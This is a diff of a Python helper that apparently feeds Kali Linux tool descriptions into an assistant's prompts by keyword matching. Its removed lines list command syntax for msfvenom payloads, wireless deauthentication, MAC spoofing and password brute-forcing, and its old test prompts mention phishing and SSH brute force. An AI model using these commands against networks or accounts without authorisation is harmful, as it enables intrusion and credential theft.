-        "wfuzz", "recon-ng", "maltego", "ettercap", "netcat", "responder",
-        "mimikatz", "volatility", "autopsy", "binwalk", "ghidra", "radare2",
-        "airmon-ng", "airodump-ng", "aireplay-ng", "msfvenom", "msfconsole",
-        "macchanger"
-    ]
-    
-    for tool in common_tools:
-        if tool in prompt_lower:
-            tools.append(tool)
-    
-    return tools
-
-def _get_tool_specific_info(tool: str) -> Optional[str]:
-    """Get detailed information about a specific tool."""
-    tool_info = {
-        "nmap": "Network scanner. Common flags: -sS (SYN scan), -sV (version detection), -sC (scripts), -A (aggressive), -p (port specification), -O (OS detection), -T(0-5) (timing).",
-        "metasploit": "Exploitation framework. Start with 'msfconsole'. Key commands: search (find modules), use (select module), set (configure options), run/exploit (execute module), sessions (manage targets), back (return to main).",
-        "msfconsole": "Metasploit console. Start with search [term] to find modules, use [path] to select a module, show options to view required settings, set RHOSTS/LHOST/etc., and run or exploit to execute.",
-        "msfvenom": "Payload generator. Syntax: msfvenom -p [payload] LHOST=[your IP] LPORT=[port] -f [format] -o [output]. Common formats: exe, elf, raw, python, php.",
-        "aircrack-ng": "WiFi password cracking suite. Main tools: airmon-ng (manage monitor mode), airodump-ng (capture packets), aireplay-ng (packet injection), aircrack-ng (crack passwords).",
-        "airmon-ng": "Monitor mode tool. Usage: airmon-ng check kill (stop interfering processes), airmon-ng start wlan0 (enable monitor mode), airmon-ng stop wlan0mon (disable monitor mode).",
-        "airodump-ng": "WiFi scanner and packet capture. Usage: airodump-ng wlan0mon (scan all networks), airodump-ng -c [channel] --bssid [MAC] -w [file] wlan0mon (target specific AP).",
-        "aireplay-ng": "Wireless packet injection. Common uses: aireplay-ng -0 10 -a [BSSID] -c [client] wlan0mon (deauth attack), aireplay-ng -1 0 -e [ESSID] -a [BSSID] -h [MAC] wlan0mon (fake auth).",
-        "macchanger": "MAC address spoofing tool. Usage: 1) ifconfig interface down 2) macchanger [option] interface 3) ifconfig interface up. Options: -r (random MAC), -a (same vendor type), -A (random vendor), -p (restore original), -m XX:XX:XX:XX:XX:XX (specific MAC).",
-        "hydra": "Login brute-forcer. Syntax: hydra -l [user] -P [wordlist] [service://server] [options].",
-        "hashcat": "Fast password cracker. Syntax: hashcat -m [hash type] -a [attack mode] [hash file] [wordlist].",
-        "john": "Password cracker. Basic usage: 'john --wordlist=[path] [hash file]'. Use --format to specify hash type.",
-        "wireshark": "Packet analyzer with GUI. For terminal, use 'tshark'.",
-        "sqlmap": "SQL injection scanner. Basic usage: 'sqlmap -u [URL] --dbs' to find databases.",
-        "burpsuite": "Web application security testing. Use proxy on 127.0.0.1:8080 by default.",
-        "nikto": "Web server scanner. Basic usage: 'nikto -h [host]'.",
-        "gobuster": "Directory brute-forcer. Syntax: gobuster dir -u [URL] -w [wordlist].",
-        "dirb": "URL brute-forcer. Basic usage: 'dirb [URL] [wordlist]'.",
-        "wfuzz": "Web fuzzer. Can fuzz multiple parameters with various encodings.",
-        "recon-ng": "Reconnaissance framework. Use 'marketplace search' to find modules.",
-        "maltego": "Data mining tool for relationships. Has graphical interface.",
-        "ettercap": "MITM framework. Graphical with 'ettercap -G' or text with various options.",
+    # Check for tool types/categories
+    tool_categories = {
+        "wireless": ["aircrack-ng", "airmon-ng", "airodump-ng", "aireplay-ng", "wifite", "reaver", "bully", "fern-wifi-cracker"],
+        "scanner": ["nmap", "masscan", "nikto", "wpscan", "sqlmap", "gobuster", "dirb"],
+        "password": ["hydra", "john", "hashcat", "crunch", "medusa"],
+        "exploit": ["metasploit", "msfconsole", "msfvenom"],
+        "packet": ["wireshark", "tshark", "tcpdump", "ettercap", "bettercap"],
+        "forensic": ["autopsy", "foremost", "binwalk", "volatility"],
     }
     
-    return tool_info.get(tool)
+    for category, tools in tool_categories.items():
+        if category in prompt:
+            context = f"Tools for {category} in Kali Linux include: {', '.join(tools)}"
+            for tool in tools:
+                if tool in KALI_TOOLS:
+                    context += f"\n\n{format_kali_tool_info(tool, KALI_TOOLS[tool])}"
+                    # Just return info about the first matching tool to avoid overwhelming
+                    return context
+            return context
+    
+    # Check for keyword matches and return the appropriate context
+    keywords_to_check = [
+        # Aircrack related
+        ("monitor mode", AIRCRACK_PROMPTS.get("airmon-ng")),
+        ("monitor", AIRCRACK_PROMPTS.get("airmon-ng")),
+        ("packet capture", AIRCRACK_PROMPTS.get("airodump-ng")),
+        ("capture", AIRCRACK_PROMPTS.get("airodump-ng")),
+        ("deauth", AIRCRACK_PROMPTS.get("aireplay-ng")),
+        ("crack", AIRCRACK_PROMPTS.get("aircrack-ng")),
+        ("wpa", AIRCRACK_PROMPTS.get("aircrack-ng")),
+        
+        # Network related
+        ("scan", NETWORK_PROMPTS.get("scanning")),
+        ("network", NETWORK_PROMPTS.get("scanning")),
+        ("packet", NETWORK_PROMPTS.get("packet_capture")),
+        ("wifi", NETWORK_PROMPTS.get("wifi")),
+        ("wireless", NETWORK_PROMPTS.get("wifi"))
+    ]
+    
+    for keyword, context_info in keywords_to_check:
+        if keyword in prompt and context_info:
+            return format_tool_info(keyword, context_info)
+    
+    # If no specific matches, return general info about aircrack
+    if any(word in prompt for word in ["aircrack", "wireless", "wifi", "wlan", "monitor"]):
+        return AIRCRACK_PROMPTS.get("general")
+    
+    # If no specific matches, return general info about networking
+    if any(word in prompt for word in ["network", "scan", "capture", "packet"]):
+        return NETWORK_PROMPTS.get("general")
+    
+    # No relevant context found
+    return None
+
+def format_tool_info(name: str, info: Dict[str, Any]) -> str:
+    """
+    Format the tool information into a readable string
+    
+    Args:
+        name: Name or keyword for the tool
+        info: Dictionary containing tool information
+        
+    Returns:
+        Formatted string with tool information
+    """
+    result = []
+    
+    if "description" in info:
+        result.append(f"{name.upper()}: {info['description']}")
+    
+    if "usage" in info:
+        result.append(f"\nUsage: {info['usage']}")
+    
+    if "examples" in info and isinstance(info["examples"], list):
+        result.append("\nExamples:")
+        for example in info["examples"]:
+            result.append(f"  {example}")
+    
+    if "common_tools" in info and isinstance(info["common_tools"], list):
+        result.append(f"\nCommon tools: {', '.join(info['common_tools'])}")
+    
+    return "\n".join(result)
+
+def format_kali_tool_info(name: str, info: Dict[str, Any]) -> str:
+    """
+    Format Kali tool information into a readable string
+    
+    Args:
+        name: Tool name
+        info: Dictionary containing tool information
+        
+    Returns:
+        Formatted string with tool information
+    """
+    result = [f"{name.upper()}"]
+    
+    if "description" in info:
+        result.append(f"Description: {info['description']}")
+    
+    if "commands" in info:
+        result.append(f"Related commands: {', '.join(info['commands'])}")
+    
+    if "main_options" in info:
+        result.append(f"Main options: {info['main_options']}")
+        
+    if "main_commands" in info:
+        result.append(f"Main commands: {info['main_commands']}")
+    
+    if "examples" in info and isinstance(info["examples"], list):
+        result.append("Examples:")
+        for example in info["examples"]:
+            result.append(f"  {example}")
+    
+    return "\n".join(result)
 
 if __name__ == "__main__":
-    # Test the context generation
+    # Test the context extraction
     test_prompts = [
-        "Scan the network for open ports",
-        "Find all WordPress vulnerabilities on a website",
-        "Crack a WPA password from a capture file",
-        "Set up a phishing campaign",
-        "Brute force SSH login",
-        "Change my MAC address using macchanger"
+        "How do I enable monitor mode?",
+        "How can I capture packets with airodump-ng?",
+        "I want to crack a WPA password",
+        "Tell me about network scanning with nmap",
+        "What is the aircrack-ng suite?",
+        "How do I use hashcat to crack passwords?",
+        "What can I do with Metasploit?",
+        "Tell me about wireless tools in Kali"
     ]
     
     for prompt in test_prompts:
         print(f"Prompt: {prompt}")
         context = get_context_for_prompt(prompt)
-        print(f"Context: {context}\n") 
+        if context:
+            print("Context:")
+            print(context)
+        else:
+            print("No context found")
+        print("---") 
